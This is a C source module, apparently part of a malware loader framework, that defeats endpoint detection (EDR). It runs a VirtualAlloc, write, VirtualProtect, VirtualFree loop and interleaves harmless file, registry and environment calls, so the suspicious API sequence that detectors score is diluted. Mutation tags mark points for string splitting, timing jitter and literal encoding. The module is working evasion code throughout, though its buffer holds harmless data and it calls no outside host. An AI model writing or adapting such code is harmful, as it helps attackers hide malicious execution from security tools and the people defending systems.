/* MODULE: DECONDITIONER
 * TYPE: mixed_apis
 * DESC: Same alloc→write→protect→free loop as alloc_loop, but interleaves
 *       benign API calls (file I/O, registry reads) between each memory
 *       operation. Breaks the clean API N-gram that EDRs use for detection:
 *
 *       Without mixing:  VirtualAlloc → memcpy → VirtualProtect  (flagged)
 *       With mixing:     VirtualAlloc → CreateFile → ReadFile → CloseHandle
 *                        → memcpy → RegOpenKey → RegQueryValue → RegCloseKey
 *                        → VirtualProtect → GetEnvironmentVariable → VirtualFree
 *
 *       EDR token sequences become diluted with benign tokens, reducing the
 *       lift score of the suspicious sequence.
 *
 * MUTATIONS: loop_mutation, literal_encoding, loop_restructuring, timing_jitter, string_splitting
 */
#include "../header/definitions.h"

#ifndef DECON_ROUNDS
#define DECON_ROUNDS 15
#endif

// Read a few bytes from a legitimate system file to inject benign file I/O tokens
FORCE_INLINE static void do_benign_file_io(void) {
    char read_buf[64];
    DWORD bytes_read = 0;

    // @MUTATE:string_splitting
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile != INVALID_HANDLE_VALUE) {
        ReadFile(hFile, read_buf, sizeof(read_buf), &bytes_read, NULL);
        CloseHandle(hFile);
    }
}

// Query a common registry key to inject benign registry tokens
FORCE_INLINE static void do_benign_registry_io(void) {
    HKEY hKey;
    // @MUTATE:string_splitting
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char val[128];
        DWORD val_size = sizeof(val);
        RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)val, &val_size);
        RegCloseKey(hKey);
    }
}

FORCE_INLINE void deconditioner() {
    DWORD old_prot;

    // @MUTATE:loop_mutation(fixed->GetTickCount_modulo)
    // @MUTATE:loop_restructuring(for->while|unroll)
    for (int i = 0; i < DECON_ROUNDS; i++) {

        // @MUTATE:api_wrapper_injection(VirtualAlloc)
        // @MUTATE:literal_encoding
        char *buf = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
        if (!buf) continue;

        // Benign file I/O between alloc and write — breaks N-gram
        do_benign_file_io();

        // Fill with benign data
        // @MUTATE:literal_encoding
        for (int k = 0; k < PAYLOAD_LEN; k++) {
            buf[k] = (char)(k ^ (i + 0x41));
        }

        // Benign registry I/O between write and protect — breaks N-gram
        do_benign_registry_io();

        // @MUTATE:timing_jitter
        // @MUTATE:api_wrapper_injection(VirtualProtect)
        VirtualProtect(buf, PAYLOAD_LEN, p_RX, &old_prot);

        // One more benign call between protect and free
        // @MUTATE:string_splitting
        char env_buf[256];
        GetEnvironmentVariableA("COMPUTERNAME", env_buf, sizeof(env_buf));

        // @MUTATE:timing_jitter
        // @MUTATE:literal_encoding
        VirtualFree(buf, 0, 0x8000);
    }
}
